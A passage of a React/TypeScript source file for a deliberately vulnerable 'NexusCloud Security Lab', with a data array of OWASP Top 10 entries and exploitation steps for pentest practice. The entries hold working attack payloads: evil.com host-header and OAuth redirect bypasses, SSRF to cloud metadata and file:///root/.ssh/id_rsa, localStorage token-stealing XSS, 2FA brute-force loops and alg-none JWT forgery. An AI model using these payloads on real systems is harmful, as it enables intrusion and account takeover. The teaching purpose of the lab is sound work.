   GET /api/users/1/api-key → key_1
   GET /api/users/1/api-key → key_2 (key_1 still valid!)
   GET /api/users/1/api-key → key_3 (key_1 and key_2 still valid!)

2. Each call creates a new key but doesn't revoke old ones
3. An attacker who steals any historical key can use it
4. No way to revoke a compromised key`,
    impact: 'Key material proliferation. Once any API key is compromised, there is no way to revoke it without changing all keys.',
  },

  // ═══ NEW: A05 — Advanced Security Misconfiguration ═══
  {
    id: 'MISCONF-006',
    title: 'Missing Security Headers',
    difficulty: 'Medium',
    owasp: 'A05: Security Misconfiguration',
    location: 'Backend: app/main.py — No security header middleware configured',
    endpoint: 'All API responses',
    description: 'The application does not set any security headers in HTTP responses: no Content-Security-Policy (CSP), no X-Frame-Options, no X-Content-Type-Options, no Strict-Transport-Security (HSTS), no Referrer-Policy, no Permissions-Policy.',
    exploitation: `1. Check any response headers:
   curl -I http://localhost:9000/api/health

2. Missing headers enable:
   - No CSP → XSS payloads can load external scripts
   - No X-Frame-Options → Clickjacking attacks
   - No X-Content-Type-Options → MIME sniffing attacks
   - No HSTS → SSL stripping (MITM)
   - No Referrer-Policy → Token leakage via Referer header

3. Clickjacking proof-of-concept:
   <iframe src="http://target:9000/settings" style="opacity:0.1">
   User clicks "Delete Account" thinking they click attacker's button`,
    impact: 'Enables clickjacking, XSS amplification, MIME sniffing, and man-in-the-middle attacks.',
  },
  {
    id: 'MISCONF-007',
    title: 'Stack Trace Exposure in Production',
    difficulty: 'Easy',
    owasp: 'A05: Security Misconfiguration',
    location: 'Backend: app/main.py — GET /api/debug/error intentionally triggers unhandled exception',
    endpoint: 'GET /api/debug/error',
    description: 'An exposed debug endpoint triggers a division-by-zero error. The server returns a detailed stack trace revealing source code paths, file names, line numbers, and local variable values.',
    exploitation: `1. Trigger the error:
   GET /api/debug/error

2. Response includes full Python traceback:
   - File paths: /app/main.py, line 89
   - Function names and local variables
   - Python version and framework details

3. This information aids in crafting targeted exploits
4. Combined with source code analysis from other leaks`,
    impact: 'Source code path disclosure, framework version fingerprinting, and development of targeted attacks.',
  },
  {
    id: 'MISCONF-008',
    title: 'HTTP Method Tampering on Protected Routes',
    difficulty: 'Medium',
    owasp: 'A05: Security Misconfiguration',
    location: 'Backend: app/main.py — MethodOverrideMiddleware allows arbitrary method rewriting',
    endpoint: 'Any endpoint with method-specific routing',
    description: 'The X-HTTP-Method-Override middleware rewrites the request method before routing. Combined with endpoints that only protect specific methods, this enables bypassing access controls by using an unprotected method with the override header.',
    exploitation: `1. A DELETE endpoint requires admin:
   DELETE /api/admin/users/3 → 403 Forbidden (non-admin)

2. But POST might not have the same check:
   POST /api/admin/users/3
   X-HTTP-Method-Override: DELETE
   → The middleware rewrites to DELETE, bypassing POST-level auth

3. Similarly, turn a GET into a PATCH:
   GET /api/some-endpoint
   X-HTTP-Method-Override: PATCH
   Content-Type: application/json
   Body: {"role": "admin"}`,
    impact: 'Access control bypass by spoofing HTTP methods through header injection.',
  },

  // ═══ NEW: A06 — Vulnerable Components ═══
  {
    id: 'COMP-002',
    title: 'ReDoS in Email Validation Regex',
    difficulty: 'Medium',
    owasp: 'A06: Vulnerable and Outdated Components',
    location: 'Backend: app/api/routes/internal.py — validate_email() uses evil regex pattern ^([a-zA-Z0-9]+)*@',
    endpoint: 'POST /api/internal/validate-email',
    description: 'The email validation regex ^([a-zA-Z0-9]+)*@ contains a classic catastrophic backtracking pattern: a quantified group inside another quantifier. This is a known vulnerable pattern in regex engines that use backtracking (NFA).',
    exploitation: `1. The pattern ([a-zA-Z0-9]+)* with nested quantifiers:
   - For input "aaa...a!" the engine tries every possible split
   - 30 chars → 2^30 = ~1 billion backtrack operations

2. Craft a ReDoS payload:
   POST /api/internal/validate-email
   { "email": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!" }

3. Measure: response time increases exponentially with input length
   - 20 chars: ~1 second
   - 25 chars: ~30 seconds
   - 30 chars: ~minutes (server hangs)

4. Many real-world vulnerabilities use this exact pattern`,
    impact: 'Application-level denial of service via a single request. The regex engine consumes 100% CPU.',
  },

  // ═══ NEW: A07 — Advanced Auth Failures ═══
  {
    id: 'AUTH-004',
    title: 'Timing Side-Channel in Login',
    difficulty: 'Medium',
    owasp: 'A07: Identification and Authentication Failures',
    location: 'Backend: app/api/routes/auth.py — login() checks user existence before password hash',
    endpoint: 'POST /api/auth/login',
    description: 'The login flow first queries the database for the username, then verifies the bcrypt hash. For non-existent users, the response is immediate. For existing users, bcrypt verification adds ~200ms. This timing difference reveals valid usernames.',
    exploitation: `1. Time requests for non-existent users:
   POST /api/auth/login {"username":"nonexistent","password":"x"}
   → ~5ms response (no bcrypt computation)

2. Time requests for existing users:
   POST /api/auth/login {"username":"admin","password":"x"}
   → ~200ms response (bcrypt verification runs)

3. Automate enumeration:
   for user in wordlist:
       start = time.time()
       requests.post(login_url, json={"username": user, "password": "x"})
       elapsed = time.time() - start
       if elapsed > 0.1: print(f"FOUND: {user}")

4. Even with identical error messages, timing reveals the truth`,
    impact: 'Username enumeration via timing analysis. Bypasses defenses that use generic error messages.',
  },
  {
    id: 'AUTH-005',
    title: '2FA Bypass — Direct Endpoint Access',
    difficulty: 'Medium',
    owasp: 'A07: Identification and Authentication Failures',
    location: 'Backend: app/api/routes/auth.py — 2FA verification is optional, protected endpoints don\'t check 2fa_verified',
    endpoint: 'All authenticated endpoints',
    description: 'After setting up 2FA via /api/auth/setup-2fa, the user should verify the code before accessing protected resources. However, the JWT is issued at login (before 2FA), and no endpoint checks the 2FA verification status.',
    exploitation: `1. Login normally:
   POST /api/auth/login → get JWT token

2. Set up 2FA:
   POST /api/auth/setup-2fa → code generated

3. Skip verification — go directly to protected endpoints:
   GET /api/projects (with JWT from step 1)
   → Full access! No 2FA check on any endpoint

4. The JWT is valid regardless of 2FA status
5. /api/auth/2fa-status shows verified: false, but nothing enforces it`,
    impact: '2FA is purely cosmetic. It provides no additional security since all endpoints accept the pre-2FA token.',
  },
  {
    id: 'AUTH-006',
    title: '2FA Brute Force — No Rate Limit on Code Verification',
    difficulty: 'Medium',
    owasp: 'A07: Identification and Authentication Failures',
    location: 'Backend: app/api/routes/auth.py — POST /api/auth/verify-2fa has no attempt limit',
    endpoint: 'POST /api/auth/verify-2fa',
    description: 'The 2FA code is a 4-digit number (10,000 possibilities). The verification endpoint has no rate limiting, attempt counter, or lockout mechanism. An attacker can brute-force all possible codes in seconds.',
    exploitation: `1. Set up 2FA to generate a code:
   POST /api/auth/setup-2fa

2. Brute-force the 4-digit code:
   for code in range(10000):
       resp = requests.post("/api/auth/verify-2fa",
           json={"code": f"{code:04d}"},
           headers={"Authorization": f"Bearer {token}"})
       if resp.json().get("verified"):
           print(f"Code: {code:04d}")
           break

3. At ~100 requests/sec, all 10,000 codes tested in ~100 seconds
4. No lockout, no delay, no alert on suspicious activity`,
    impact: '2FA bypass via brute-force. 4-digit codes provide negligible security without rate limiting.',
  },
  {
    id: 'AUTH-007',
    title: 'Password Reset via Host Header Poisoning',
    difficulty: 'Hard',
    owasp: 'A07: Identification and Authentication Failures',
    location: 'Backend: app/api/routes/auth.py — forgot_password() uses request Host header in reset link',
    endpoint: 'POST /api/auth/forgot-password',
    description: 'The password reset endpoint constructs the reset link using the HTTP Host header. An attacker can set a custom Host header to redirect the reset link to their own domain, stealing the token when the victim clicks the link.',
    exploitation: `1. Send a reset request with a poisoned Host header:
   POST /api/auth/forgot-password
   Host: evil.com
   Content-Type: application/json
   {"email": "admin@nexuscloud.io"}

2. Response includes:
   {"debug_link": "http://evil.com/reset-password?token=abc123..."}

3. In a real scenario:
   - The email would be sent to the victim with the evil.com link
   - Victim clicks the link → token sent to attacker's server
   - Attacker uses the token to reset the victim's password

4. The Host header is user-controlled and should never be trusted`,
    impact: 'Account takeover via password reset token theft. Attacker can reset any user\'s password.',
  },
  {
    id: 'AUTH-008',
    title: 'OAuth Redirect URI Bypass (Prefix Check)',
    difficulty: 'Hard',
    owasp: 'A07: Identification and Authentication Failures',
    location: 'Backend: app/api/routes/auth.py — oauth/authorize validates redirect_uri with startswith() only',
    endpoint: 'GET /api/auth/oauth/authorize?redirect_uri={evil_url}',
    description: 'The OAuth authorization endpoint validates the redirect_uri using a simple startswith() check against "http://localhost:9001". This can be bypassed by appending to the allowed prefix.',
    exploitation: `1. Legitimate redirect:
   /api/auth/oauth/authorize?redirect_uri=http://localhost:9001/callback
   → Allowed ✓

2. Bypass with subdomain:
   ?redirect_uri=http://localhost:9001.evil.com/steal
   → startswith("http://localhost:9001") → Allowed! ✗

3. Bypass with @ (URL authority confusion):
   ?redirect_uri=http://localhost:9001@evil.com/steal
   → startswith check passes, browser goes to evil.com

4. Bypass with path traversal:
   ?redirect_uri=http://localhost:9001/../../evil.com

5. Authorization code sent to attacker-controlled URL`,
    impact: 'OAuth authorization code theft. Attacker receives the code at their domain and can exchange it for an access token.',
  },
  {
    id: 'AUTH-009',
    title: 'OAuth CSRF — Missing State Parameter',
    difficulty: 'Medium',
    owasp: 'A07: Identification and Authentication Failures',
    location: 'Backend: app/api/routes/auth.py — oauth/authorize and oauth/callback don\'t validate state',
    endpoint: 'GET /api/auth/oauth/authorize',
    description: 'The OAuth flow does not require or validate the state parameter. This enables Cross-Site Request Forgery on the OAuth flow — an attacker can initiate OAuth on their behalf and trick a victim into completing it, linking the attacker\'s external account to the victim\'s profile.',
    exploitation: `1. Attacker initiates OAuth:
   GET /api/auth/oauth/authorize?redirect_uri=http://localhost:9001/callback&state=
   → Gets authorization code

2. Attacker crafts a CSRF page:
   <img src="http://target:9000/api/auth/oauth/callback?code=ATTACKER_CODE">

3. Victim visits the page → their session completes the OAuth callback
4. Attacker's external account is now linked to victim's profile

5. The state parameter should be a CSRF token tied to the user's session`,
    impact: 'Account linking CSRF. Attacker can link their external account to victim\'s profile for persistent access.',
  },
  {
    id: 'AUTH-010',
    title: 'Account Enumeration via Email in Password Reset',
    difficulty: 'Easy',
    owasp: 'A07: Identification and Authentication Failures',
    location: 'Backend: app/api/routes/auth.py — forgot_password() returns different errors for existing vs non-existing emails',
    endpoint: 'POST /api/auth/forgot-password',
    description: 'The password reset endpoint reveals whether an email is registered by returning a specific error message: "No account found with email \'X\'" for non-existent emails. This allows attackers to enumerate all registered email addresses.',
    exploitation: `1. Test with a non-existent email:
   POST /api/auth/forgot-password {"email":"nonexistent@test.com"}
   → 404: "No account found with email 'nonexistent@test.com'"

2. Test with a registered email:
   POST /api/auth/forgot-password {"email":"admin@nexuscloud.io"}
   → 200: "Password reset link sent to your email"

3. Automate enumeration:
   for email in email_list:
       if status != 404: print(f"Found: {email}")

4. Build a list of valid emails for targeted phishing`,
    impact: 'Email enumeration enables targeted phishing and credential stuffing attacks.',
  },

  // ═══ NEW: A08 — Data Integrity Failures ═══
  {
    id: 'INTEG-002',
    title: 'Unsigned Webhook Payload — No HMAC Verification',
    difficulty: 'Medium',
    owasp: 'A08: Software and Data Integrity Failures',
    location: 'Backend: app/api/routes/internal.py — POST /api/internal/webhook-receive processes payloads without signature check',
    endpoint: 'POST /api/internal/webhook-receive',
    description: 'The webhook receiver endpoint processes incoming payment notifications without verifying any HMAC signature. An attacker can send fake payment confirmation webhooks to mark orders as paid without actual payment.',
    exploitation: `1. Send a forged payment webhook:
   POST /api/internal/webhook-receive
   Content-Type: application/json
   {
     "event": "payment.completed",
     "order_id": "ORDER-12345",
     "amount": 99999.99,
     "status": "completed"
   }

2. Response: {"processed": true, "message": "Payment of $99999.99 confirmed"}
3. No X-Webhook-Signature header checked
4. No shared secret or HMAC verification
5. Any internet-connected client can forge payment confirmations`,
    impact: 'Financial fraud via forged payment webhooks. Orders can be marked as paid without actual payment.',
  },
  {
    id: 'INTEG-003',
    title: 'No CSRF Protection on State-Changing Endpoints',
    difficulty: 'Medium',
    owasp: 'A08: Software and Data Integrity Failures',
    location: 'Backend: entire application — no CSRF tokens, Bearer auth in localStorage',
    endpoint: 'All POST/PATCH/DELETE endpoints',
    description: 'The application uses Bearer tokens stored in localStorage. While this prevents automatic cookie-based CSRF, if XSS is achieved (which it can be via stored XSS), the token can be read from localStorage and used for CSRF attacks.',
    exploitation: `1. First exploit stored XSS (INJ-003, SOCIAL-001, etc.)
2. XSS payload reads token from localStorage:

   <script>
   const token = localStorage.getItem('nc_token');
   fetch('/api/users/1', {
     method: 'PATCH',
     headers: {'Authorization': 'Bearer '+token, 'Content-Type': 'application/json'},
     body: JSON.stringify({role: 'guest'})
   });
   </script>

3. The admin viewing the XSS payload unknowingly demotes themselves
4. No CSRF token to prevent the forged request`,
    impact: 'Cross-site request forgery when combined with XSS. Can perform any action as the victim.',
  },
  {
    id: 'INTEG-004',
    title: 'Client-Side Validation Only — No Server-Side Checks',
    difficulty: 'Easy',
    owasp: 'A08: Software and Data Integrity Failures',
    location: 'Frontend: various forms with HTML5 validation attributes\nBackend: no equivalent server-side validation',
    endpoint: 'POST /api/auth/register, PATCH /api/users/{id}',
    description: 'Form validation is only performed on the client-side using HTML5 attributes (type="email", required, etc.). The backend accepts any data sent directly via API calls, bypassing all frontend validation.',
    exploitation: `1. Frontend requires email format — but backend doesn't:
   POST /api/auth/register
   { "username": "x", "email": "not-an-email", "password": "a" }
   → Success! No server-side email validation

2. Frontend hides role field — but backend accepts it:
   PATCH /api/users/3
   { "role": "admin" }
   → Role changed without frontend form

3. Any tool that sends HTTP directly (curl, Burp, Postman) bypasses validation`,
    impact: 'All client-side validation is bypassable. Backend accepts malformed, oversized, and malicious input.',
  },

  // ═══ NEW: A09 — Logging Failures ═══
  {
    id: 'LOG-003',
    title: 'Log Forging via Newline Injection',
    difficulty: 'Medium',
    owasp: 'A09: Security Logging and Monitoring Failures',
    location: 'Backend: app/api/routes/internal.py — POST /api/internal/log-action logs unsanitized input',
    endpoint: 'POST /api/internal/log-action',
    description: 'The audit logging endpoint writes user-supplied action and details directly to the log file without sanitizing newline characters (\\n, \\r). An attacker can inject fake log entries to cover tracks or frame other users.',
    exploitation: `1. Inject fake log entries:
   POST /api/internal/log-action
   {
     "action": "normal_action\\n[2026-04-24 10:00:00] [INFO] [USER:1] Action: successful_backup | Details: All data verified",
     "details": "nothing suspicious"
   }

2. The log now contains a fake entry that looks like admin activity
3. Forge multiple entries to create a false narrative:
   - "Admin performed routine maintenance"
   - "Security scan: no issues detected"
   - "All login attempts legitimate"

4. Frame another user:
   "[USER:5] Action: data_exfiltration | Details: 500 records exported"`,
    impact: 'Forensic evidence tampering. Attackers can cover their tracks or frame innocent users.',
  },
  {
    id: 'LOG-004',
    title: 'Sensitive Data in Application Logs',
    difficulty: 'Medium',
    owasp: 'A09: Security Logging and Monitoring Failures',
    location: 'Backend: app/api/routes/auth.py — login() and various endpoints log sensitive data',
    endpoint: 'POST /api/auth/login, POST /api/auth/forgot-password',
    description: 'Various endpoints log request details that may include sensitive information: passwords in login attempts, reset tokens, API keys, and user PII. Anyone with log access can extract this data.',
    exploitation: `1. The forgot-password endpoint logs and returns the reset token:
   POST /api/auth/forgot-password {"email":"admin@nexuscloud.io"}
   → Response includes "debug_token": "abc123..."

2. Internal log entries contain full request details
3. If log files are accessible:
   GET /api/internal/logs
   → May contain tokens, keys, and error details with user data

4. Log aggregation services (ELK, Splunk) would index all this sensitive data`,
    impact: 'Credential exposure via logs. Reset tokens, API keys, and user data accessible to anyone with log access.',
  },
  {
    id: 'LOG-005',
    title: 'Missing Audit Trail for Critical Admin Actions',
    difficulty: 'Medium',
    owasp: 'A09: Security Logging and Monitoring Failures',
    location: 'Backend: app/api/routes/admin.py — admin actions do not write to AuditLog table',
    endpoint: 'All /api/admin/* endpoints',
    description: 'The AuditLog model exists in the database, but no admin actions write to it. User role changes, account deactivations, data exports, webhook tests, and debug info access are all unlogged. A malicious admin leaves no trace.',
    exploitation: `1. Perform multiple admin actions:
   - PATCH /api/admin/users/3 {"role":"guest"} (demote a user)
   - GET /api/admin/export?format=csv&resource=users (export all data)
   - GET /api/admin/debug (access JWT secret)
   - POST /api/admin/webhook-test {"url":"http://evil.com"} (SSRF)

2. Check audit logs:
   GET /api/admin/audit-logs
   → {"items": [], "total": 0}

3. Zero entries — no evidence of any admin action
4. Impossible to detect insider threats or compromised admin accounts`,
    impact: 'Complete lack of accountability for admin actions. Insider threats and compromised accounts are undetectable.',
  },

  // ═══ NEW: A10 — Advanced SSRF ═══
  {
    id: 'SSRF-002',
    title: 'SSRF via Redirect Chain',
    difficulty: 'Medium',
    owasp: 'A10: Server-Side Request Forgery',
    location: 'Backend: app/api/routes/internal.py — POST /api/internal/url-preview follows redirects',
    endpoint: 'POST /api/internal/url-preview',
    description: 'The URL preview endpoint follows HTTP redirects (follow_redirects=True). While direct access to internal IPs is blocked (127.0.0.1, localhost), an attacker can host a redirect on their server that points to internal resources.',
    exploitation: `1. Set up an attacker-controlled redirect:
   # On evil.com, configure:
   HTTP/1.1 302 Found
   Location: http://127.0.0.1:9000/api/admin/debug

2. Request the preview:
   POST /api/internal/url-preview
   { "url": "https://evil.com/redirect" }

3. The server checks evil.com → not in blocklist → allowed
4. Follows redirect to 127.0.0.1 → accesses internal endpoint
5. Response includes the internal debug info

6. Also works for cloud metadata:
   evil.com redirects to http://169.254.169.254/latest/meta-data/`,
    impact: 'Internal network access via redirect chain. Bypasses hostname blocklist to reach internal services.',
  },
  {
    id: 'SSRF-003',
    title: 'SSRF via file:// Scheme',
    difficulty: 'Medium',
    owasp: 'A10: Server-Side Request Forgery',
    location: 'Backend: app/api/routes/internal.py — POST /api/internal/url-preview has no scheme validation',
    endpoint: 'POST /api/internal/url-preview',
    description: 'The URL preview endpoint only blocks specific hostnames but does not restrict URL schemes. The file:// scheme can be used to read local files from the server.',
    exploitation: `1. Read local files:
   POST /api/internal/url-preview
   { "url": "file:///etc/passwd" }

2. Read application source code:
   { "url": "file:///app/core/config.py" }
   → Contains JWT_SECRET and database path

3. Read the database file:
   { "url": "file:///app/data/lab.db" }
   → Binary SQLite database with all user data

4. Read SSH keys:
   { "url": "file:///root/.ssh/id_rsa" }

Note: httpx may or may not support file:// depending on version.`,
    impact: 'Local file read via SSRF. Can access application source code, configuration, database, and system files.',
  },
  {
    id: 'SSRF-004',
    title: 'SSRF Blocklist Bypass — IP Obfuscation',
    difficulty: 'Hard',
    owasp: 'A10: Server-Side Request Forgery',
    location: 'Backend: app/api/routes/internal.py — url_preview() only blocks literal "127.0.0.1" and "localhost"',
    endpoint: 'POST /api/internal/url-preview',
    description: 'The SSRF protection only checks for exact string matches against "127.0.0.1" and "localhost". There are dozens of alternative representations of localhost that bypass this check.',
    exploitation: `1. All of these resolve to 127.0.0.1 but bypass the blocklist:

   { "url": "http://0x7f000001:9000/api/admin/debug" }     → hex IP
   { "url": "http://2130706433:9000/api/admin/debug" }      → decimal IP
   { "url": "http://0177.0.0.1:9000/api/admin/debug" }      → octal IP
   { "url": "http://[::1]:9000/api/admin/debug" }            → IPv6 loopback
   { "url": "http://0:9000/api/admin/debug" }                → 0 = localhost
   { "url": "http://127.0.0.1.nip.io:9000/api/admin/debug" } → DNS rebinding service
   { "url": "http://127.1:9000/api/admin/debug" }            → abbreviated IPv4

2. Each bypasses the string comparison blocklist
3. The proper fix requires resolving the hostname to an IP and checking the IP against a CIDR block`,
    impact: 'Complete SSRF blocklist bypass. Access any internal service despite hostname filtering.',
  },
  {
    id: 'SSRF-005',
    title: 'Blind SSRF via URL Preview',
    difficulty: 'Medium',
    owasp: 'A10: Server-Side Request Forgery',
    location: 'Backend: app/api/routes/internal.py — POST /api/internal/url-preview reveals status codes and timing',
    endpoint: 'POST /api/internal/url-preview',
    description: 'Even when internal content is not directly returned, the URL preview reveals the HTTP status code and response timing. This enables port scanning and service discovery on the internal network.',
    exploitation: `1. Scan internal ports — open ports return quickly with status codes:
   { "url": "http://127.0.0.1:22" }   → status: connection info
   { "url": "http://127.0.0.1:3306" } → status/error reveals MySQL
   { "url": "http://127.0.0.1:6379" } → status/error reveals Redis

2. Scan internal hosts:
   for ip in 10.0.0.1-254:
       POST /api/internal/url-preview {"url": f"http://{ip}:80"}
       → Different timing/status reveals live hosts

3. The error message also leaks information:
   "Fetch failed: Connection refused" → port closed
   "Fetch failed: Timeout" → host exists but port filtered
   200/301/404 → service found!`,
    impact: 'Internal network reconnaissance via blind SSRF. Port scanning and service discovery from the server.',
  },

  // ═══ Final 6 — Mixed Categories ═══
  {
    id: 'CRYPTO-007',
    title: 'JWT "none" Algorithm Not Rejected',
    difficulty: 'Hard',
    owasp: 'A02: Cryptographic Failures',
    location: 'Backend: app/core/security.py — decode_token() uses python-jose with configurable algorithms',
    endpoint: 'All authenticated endpoints',
    description: 'The JWT library python-jose may accept tokens with "alg": "none" if not explicitly configured to reject it. An attacker can craft an unsigned token with no signature, and if accepted, bypass authentication entirely.',
    exploitation: `1. Take a valid JWT and decode the header:
   {"alg": "HS256", "typ": "JWT"}

2. Change to none algorithm:
   {"alg": "none", "typ": "JWT"}

3. Set any payload:
   {"sub": "1", "role": "admin", "exp": 9999999999}

4. Base64-encode both parts, remove the signature:
   eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.

5. Send the unsigned token:
   Authorization: Bearer <token_without_signature>

6. If accepted → full admin access without knowing the secret`,
    impact: 'Complete authentication bypass. Attacker can forge tokens for any user/role without the signing key.',
  },
  {
    id: 'AUTH-011',
    title: 'Account Lockout Bypass via Username Case Variation',
    difficulty: 'Easy',
    owasp: 'A07: Identification and Authentication Failures',
    location: 'Backend: app/api/routes/auth.py — login() queries by exact username match',
    endpoint: 'POST /api/auth/login',
    description: 'Even if account lockout were implemented (it is not), the username comparison is case-sensitive. An attacker can bypass per-username rate limiting by varying the case: "admin", "Admin", "ADMIN" are treated as different usernames for lockout tracking but may resolve to the same account.',
    exploitation: `1. Attempt login with case variations:
   POST /api/auth/login {"username":"admin","password":"guess1"}
   POST /api/auth/login {"username":"Admin","password":"guess2"}
   POST /api/auth/login {"username":"ADMIN","password":"guess3"}
   POST /api/auth/login {"username":"aDmIn","password":"guess4"}

2. Each variation has its own lockout counter (if lockout existed)
3. Since there is NO lockout at all, this is doubly exploitable
4. With case-insensitive DB: all resolve to same user, unlimited attempts`,
    impact: 'Lockout bypass (if implemented) via case variation. Currently, no lockout exists at all.',
  },
  {
    id: 'MISCONF-009',
    title: 'Directory Listing on Upload Path',
    difficulty: 'Easy',
    owasp: 'A05: Security Misconfiguration',
    location: 'Backend: app/main.py — StaticFiles mounted at /uploads with directory listing',
    endpoint: 'GET /uploads/',
    description: 'The /uploads directory is served as static files. Depending on the StaticFiles configuration, directory listing may be enabled, revealing all uploaded filenames. Even without directory listing, sequential filename guessing works because filenames are predictable (original filename used).',
    exploitation: `1. Try directory listing:
   GET /uploads/

2. If listing is disabled, filenames are the original uploaded names:
   GET /uploads/report.pdf
   GET /uploads/credentials.xlsx
   GET /uploads/database_backup.sql

3. Enumerate common filenames:
   GET /uploads/id_rsa
   GET /uploads/.env
   GET /uploads/config.json

4. Combined with path traversal (FILE-002), uploaded files may appear in unexpected locations`,
    impact: 'Exposure of all uploaded files. Sensitive documents accessible via filename guessing.',
  },
  {
    id: 'COMP-003',
    title: 'Server-Side Object Injection via Deep Merge',
    difficulty: 'Hard',
    owasp: 'A06: Vulnerable and Outdated Components',
    location: 'Backend: app/api/routes/internal.py — POST /api/internal/merge-config uses unsafe deep_merge()',
    endpoint: 'POST /api/internal/merge-config',
    description: 'The deep merge function recursively merges user-supplied JSON into the server config without key sanitization. Special keys like __class__, __init__, __globals__ can be injected to manipulate Python objects on the server side.',
    exploitation: `1. Override hidden config values:
   POST /api/internal/merge-config
   { "config": { "debug": true, "admin_mode": true } }

2. Attempt Python-specific key injection:
   { "config": { "__class__": { "__init__": "overwritten" } } }

3. Override nested feature flags:
   { "config": { "features": { "admin": false } } }
   → Disables admin features for everyone

4. Similar to JavaScript prototype pollution but in Python context`,
    impact: 'Server configuration manipulation. Can enable debug mode, disable security features, or inject arbitrary config values.',
  },
  {
    id: 'INTEG-005',
    title: 'Debug Information Exposed in API Responses',
    difficulty: 'Easy',
    owasp: 'A08: Software and Data Integrity Failures',
    location: 'Backend: app/api/routes/auth.py — forgot_password() returns debug_token and debug_link in response',
    endpoint: 'POST /api/auth/forgot-password',
    description: 'The password reset endpoint returns the reset token and full reset link directly in the API response body (debug_token, debug_link). In a real application, these should only be sent via email to the account owner — never exposed in the API response.',
    exploitation: `1. Request password reset for any user:
   POST /api/auth/forgot-password
   { "email": "admin@nexuscloud.io" }

2. Response includes:
   {
     "debug_link": "http://localhost:9000/reset-password?token=abc123...",
     "debug_token": "abc123..."
   }

3. Use the token directly:
   POST /api/auth/reset-password
   { "token": "abc123...", "new_password": "hacked" }

4. No need for email access — token is in the API response`,
    impact: 'Instant account takeover. Password reset tokens exposed in API response for any user.',
  },
  {
    id: 'LOG-006',
    title: 'Error Messages Reveal Internal File Paths',
    difficulty: 'Easy',
    owasp: 'A09: Security Logging and Monitoring Failures',
    location: 'Backend: multiple endpoints — exception handlers return str(e) with full path info',
    endpoint: 'GET /api/internal/check-exists?table=nonexistent, GET /api/admin/export?format=x',
    description: 'Error responses from various endpoints include internal file paths, database schema details, Python module paths, and stack frame information. This helps attackers understand the server file structure and identify additional attack vectors.',
    exploitation: `1. Trigger a database error:
   GET /api/internal/check-exists?table=nonexistent&column=x&value=x
   → "error": "no such table: nonexistent"

2. Trigger a command error:
   GET /api/admin/export?format=x&resource=x
   → Error reveals sqlite3 path and command structure

3. Trigger an import error (SSTI):
   POST /api/internal/render-template {"template":"{{invalid}}"}
   → "Template error: 'invalid' is undefined" with Jinja2 context

4. Each error message reveals more about the internal structure`,
    impact: 'Information disclosure aiding further exploitation. Reveals file paths, database names, and framework internals.',
  },
]

/* ── OWASP Category Grouping ──────────────────────────────────── */

const owaspCategories = [
  'A01: Broken Access Control',
  'A02: Cryptographic Failures',
  'A03: Injection',
  'A04: Insecure Design',
  'A05: Security Misconfiguration',
  'A06: Vulnerable and Outdated Components',
  'A07: Identification and Authentication Failures',
  'A08: Software and Data Integrity Failures',
  'A09: Security Logging and Monitoring Failures',
  'A10: Server-Side Request Forgery',
]

const difficultyColor: Record<Difficulty, string> = {
  Easy: 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20',
  Medium: 'bg-amber-500/10 text-amber-400 border-amber-500/20',
  Hard: 'bg-red-500/10 text-red-400 border-red-500/20',
}

/* ── Component ────────────────────────────────────────────────── */

export default function VulnList() {
  const [expanded, setExpanded] = useState<Record<string, boolean>>({})
  const [filter, setFilter] = useState<Difficulty | 'All'>('All')
  const [search, setSearch] = useState('')

  const toggle = (id: string) =>
    setExpanded(prev => ({ ...prev, [id]: !prev[id] }))

  const toggleCategory = (cat: string) =>
    setExpanded(prev => ({ ...prev, [`cat_${cat}`]: !prev[`cat_${cat}`] }))

  const filtered = vulnerabilities.filter(v => {
    if (filter !== 'All' && v.difficulty !== filter) return false
    if (search) {
      const s = search.toLowerCase()
      return (
        v.title.toLowerCase().includes(s) ||
        v.id.toLowerCase().includes(s) ||
        v.endpoint.toLowerCase().includes(s) ||
        v.description.toLowerCase().includes(s)
      )
    }
    return true
  })

  const grouped = owaspCategories.map(cat => ({
    category: cat,
    vulns: filtered.filter(v => v.owasp === cat),
  })).filter(g => g.vulns.length > 0)

  const totalFiltered = filtered.length
  const countByDiff = {
    Easy: filtered.filter(v => v.difficulty === 'Easy').length,
    Medium: filtered.filter(v => v.difficulty === 'Medium').length,
    Hard: filtered.filter(v => v.difficulty === 'Hard').length,
  }

  return (
    <div className="min-h-screen bg-[#0a0a0f] text-gray-200">
      {/* Header */}
      <header className="border-b border-gray-800 bg-[#0f0f18]">
        <div className="mx-auto max-w-5xl px-6 py-6">
          <div className="flex items-center justify-between">
            <div>
              <Link to="/login" className="inline-flex items-center gap-1.5 text-xs text-gray-500 hover:text-gray-300 mb-3">
                <ArrowLeft className="h-3 w-3" /> Back to NexusCloud
              </Link>
              <h1 className="text-2xl font-bold text-white">NexusCloud Security Lab</h1>
              <p className="mt-1 text-sm text-gray-500">
                Vulnerability reference guide for penetration testing practice
              </p>
            </div>
            <div className="flex items-center gap-3 text-xs">
              <span className="rounded-full border border-gray-700 bg-gray-800/50 px-3 py-1 text-gray-400">
                {vulnerabilities.length} vulnerabilities
              </span>
              <span className="rounded-full border border-emerald-800 bg-emerald-900/30 px-3 py-1 text-emerald-400">
                OWASP Top 10
              </span>
            </div>
          </div>
        </div>
      </header>

      <div className="mx-auto max-w-5xl px-6 py-8 space-y-6">
        {/* Filters */}
        <div className="flex flex-wrap items-center gap-3">
          <input
            type="text"
            value={search}
            onChange={e => setSearch(e.target.value)}
            placeholder="Search vulnerabilities..."
            className="flex-1 min-w-[200px] rounded-lg border border-gray-700 bg-gray-900 px-4 py-2.5 text-sm text-white placeholder:text-gray-600 focus:outline-none focus:ring-2 focus:ring-indigo-500/50"
          />
          <div className="flex gap-1.5">
            {(['All', 'Easy', 'Medium', 'Hard'] as const).map(d => (
              <button
                key={d}
                onClick={() => setFilter(d)}
                className={`rounded-lg px-3 py-2 text-xs font-medium transition-colors ${
                  filter === d
                    ? 'bg-indigo-600 text-white'
                    : 'bg-gray-800 text-gray-400 hover:bg-gray-700 hover:text-gray-300'
                }`}
              >
                {d} {d === 'All' ? `(${totalFiltered})` : `(${countByDiff[d]})`}
              </button>
            ))}
          </div>
        </div>

        {/* Stats bar */}
        <div className="flex gap-3">
          <div className="flex-1 rounded-lg border border-gray-800 bg-[#0f0f18] p-4">
            <p className="text-[10px] uppercase tracking-wider text-gray-500">Showing</p>
            <p className="mt-1 text-xl font-bold text-white">{totalFiltered}</p>
          </div>
